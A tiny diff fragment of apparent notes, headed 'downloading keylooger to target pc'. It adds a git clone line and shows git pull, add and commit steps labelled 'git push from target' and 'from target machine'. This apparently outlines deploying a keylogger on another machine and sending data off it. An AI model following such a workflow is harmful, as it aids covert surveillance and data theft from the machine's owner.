@@ -60,6 +60,7 @@ downloading keylooger to target pc
  =====================
  git push from target
  ====================
+ git clone https://hmdsazzad17@github.com/hmdsazzad17/codelab_amrokanon.git
  git pull origin main --allow-unrelated-histories
  git add .
  git commit -m "from target machine"
